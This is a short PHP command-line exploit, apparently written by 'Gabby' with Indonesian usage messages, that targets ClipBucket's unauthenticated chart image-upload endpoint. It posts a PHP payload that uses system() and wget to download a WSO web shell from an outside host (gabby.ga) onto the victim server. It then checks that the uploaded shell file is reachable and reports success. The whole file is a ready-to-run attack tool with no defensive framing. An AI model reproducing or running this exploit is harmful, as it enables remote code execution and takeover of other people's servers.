<?php   
$options = getopt('t:n:'); 
if(!isset($options['t'], $options['n'])) 
die("\n      [+] Simple Exploiter ClipBucket by Gabby [+] \n Usage : php clip.php -t http://target.com -n bie.php\n 
-t http://target.com   = Target mu ..
-n bie.php             = Nama file yang mau kamu pakai...\n\n");  
   
$target =  $options['t']; 
$nama   =  $options['n']; 
$shell  = "{$target}/admin_area/charts/tmp-upload-images/{$nama}"; 
$target = "{$target}/admin_area/charts/ofc-library/ofc_upload_image.php?name={$nama}"; 
$data   = '<?php 
 system("wget http://gabby.ga/shell/wso.txt; mv wso.txt bie.php");
 fclose ( $handle ); 
 ?>'; 
$headers = array('User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1', 
'Content-Type: text/plain'); 
echo "============================================ \n"; 
echo ":   Simple Exploiter ClipBucket by Gabby   :\n"; 
echo "============================================ \n\n"; 
echo "[+] Upload Shell ke : {$options['t']}\n"; 
$handle = curl_init(); 
curl_setopt($handle, CURLOPT_URL, $target); 
curl_setopt($handle, CURLOPT_HTTPHEADER, $headers); 
curl_setopt($handle, CURLOPT_POSTFIELDS, $data); 
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true); 
$source = curl_exec($handle); 
curl_close($handle); 
if(!strpos($source, 'Undefined variable: HTTP_RAW_POST_DATA') && @fopen($shell, 'r')) 
{ 
echo "[+] Exploit Sukses,.. :D\n"; 
echo "[+] {$shell}\n"; 
} 
else
{ 
die("[-] Exploit Gagal,.. :(\n"); 
} 
  
?>
